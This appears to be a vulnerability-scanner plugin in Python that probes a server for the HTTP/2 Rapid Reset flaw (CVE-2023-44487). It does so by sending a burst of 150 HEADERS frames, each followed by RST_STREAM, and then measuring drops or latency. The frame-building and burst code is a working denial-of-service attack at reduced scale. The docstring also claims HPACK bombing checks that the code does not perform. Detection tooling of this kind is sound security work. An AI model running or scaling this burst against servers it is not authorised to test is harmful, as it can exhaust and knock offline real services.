"""
Plugin to detect HTTP/2 Rapid Reset & HPACK Bombing
CVSS: 9.8 (Critical)

Targets HTTP/2 multiplexing implementations (Nginx, Envoy, Cloudflare).
Detects vulnerability by sending massive concurrent HEADERS frames followed
instantly by RST_STREAM frames, monitoring for connection drops or severe latency.
"""

import socket
import ssl
import struct
import time
import logging
from typing import Optional, Dict, Any

logger = logging.getLogger("Cascavel.Plugins.HTTP2RapidReset")

# HTTP/2 Constants
PRIZM_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
FRAME_SETTINGS = 0x04
FRAME_HEADERS = 0x01
FRAME_RST_STREAM = 0x03
FLAG_END_HEADERS = 0x04

def build_frame(length: int, ftype: int, flags: int, stream_id: int, payload: bytes = b"") -> bytes:
    """Builds an HTTP/2 frame."""
    header = struct.pack(">I", (length << 8) | ftype)[1:] # 24-bit length + 8-bit type
    header += struct.pack(">B", flags)
    header += struct.pack(">I", stream_id & 0x7FFFFFFF)
    return header + payload

def check_rapid_reset(target: str, ip: str, port: int) -> tuple[bool, str]:
    """
    Attempts to execute the HTTP/2 Rapid Reset attack (CVE-2023-44487)
    at a micro scale to verify vulnerability without taking down the server.
    """
    # 1. Establish TLS connection with ALPN set to h2
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.set_alpn_protocols(['h2'])

    try:
        sock = socket.create_connection((ip, port), timeout=5)
        ssock = context.wrap_socket(sock, server_hostname=target)
        
        if ssock.selected_alpn_protocol() != 'h2':
             return False, "Server does not negotiate HTTP/2 via ALPN."

        # 2. Send Magic Preface
        ssock.sendall(PRIZM_PREFACE)

        # 3. Send Initial SETTINGS frame
        settings_frame = build_frame(0, FRAME_SETTINGS, 0x00, 0)
        ssock.sendall(settings_frame)

        # 4. Rapid Reset Attack
        # We send a burst of HEADERS frames to open streams, 
        # and immediately send RST_STREAM to close them.
        # Vulnerable servers will allocate resources for the stream upon HEADERS
        # but fail to release them quickly enough upon RST_STREAM, leading to exhaustion.
        
        # A minimal HPACK encoded header block:
        # :method: GET, :path: /, :scheme: https, :authority: target
        # For simplicity in this micro-test, we use a static, partially valid block
        # just enough to trigger the stream allocation.
        dummy_hpack = b"\x82\x84\x86\x87" # Indexed headers for method, path, scheme
        
        burst_size = 150 # Enough to test limits without causing a massive DoS
        stream_id = 1
        
        start_time = time.time()
        
        payload = bytearray()
        for _ in range(burst_size):
            # Open Stream
            payload.extend(build_frame(len(dummy_hpack), FRAME_HEADERS, FLAG_END_HEADERS, stream_id, dummy_hpack))
            # Immediately Reset Stream
            # Error code 8 = CANCEL
            rst_payload = struct.pack(">I", 8) 
            payload.extend(build_frame(4, FRAME_RST_STREAM, 0x00, stream_id, rst_payload))
            
            stream_id += 2 # Client stream IDs must be odd
            
        ssock.sendall(payload)
        
        # 5. Measure Server Response
        # Vulnerable servers will either drop the connection (TCP RST) 
        # or take significantly longer to respond to subsequent ping/data frames
        # because their event loops are overwhelmed by the cancellation queue.
        
        # Send a final benign frame and see if it responds in time
        ping_payload = b"PINGPONG"
        ping_frame = build_frame(8, 0x06, 0x00, 0, ping_payload) # PING frame
        ssock.sendall(ping_frame)
        
        # Wait for response
        resp = ssock.recv(1024)
        elapsed = time.time() - start_time
        
        if not resp:
             return True, "Connection dropped abruptly after Rapid Reset burst. Server is likely vulnerable."
             
        if elapsed > 3.0: # High latency indicates resource exhaustion
             return True, f"Server exhibited severe latency ({elapsed:.2f}s) recovering from Rapid Reset burst."

        return False, ""

    except (socket.timeout, ConnectionResetError, BrokenPipeError):
         # If it crashes or resets during the burst, it's vulnerable.
         return True, "Connection reset or timed out during the attack burst, indicating resource exhaustion."
    except Exception as e:
         logger.debug(f"Rapid Reset check failed on {target}: {e}")
         return False, ""
    finally:
        try:
             if 'ssock' in locals(): ssock.close()
        except: pass

def run(target: str, ip: str, ports: list, banners: dict) -> Optional[Dict[str, Any]]:
    """
    Checks for HTTP/2 Rapid Reset & HPACK Bombing.
    """
    vulnerability = "HTTP/2 Rapid Reset (CVE-2023-44487)"
    severity = "CRITICAL"
    description = (
        "The server is vulnerable to HTTP/2 Rapid Reset (CVE-2023-44487). "
        "An attacker can exploit HTTP/2 stream multiplexing by sending a massive number of HEADERS "
        "frames immediately followed by RST_STREAM frames. Vulnerable implementations fail to "
        "efficiently reclaim resources upon cancellation, causing catastrophic CPU and Memory "
        "exhaustion that bypasses traditional HTTP rate limits."
    )

    # HTTP/2 is typically on 443
    if 443 not in ports:
        return None

    is_vuln, evidence = check_rapid_reset(target, ip, 443)

    if is_vuln:
        return {
            "vulnerability": vulnerability,
            "severity": severity,
            "description": description,
            "endpoint": f"https://{target}:443",
            "evidence": evidence
        }

    return None
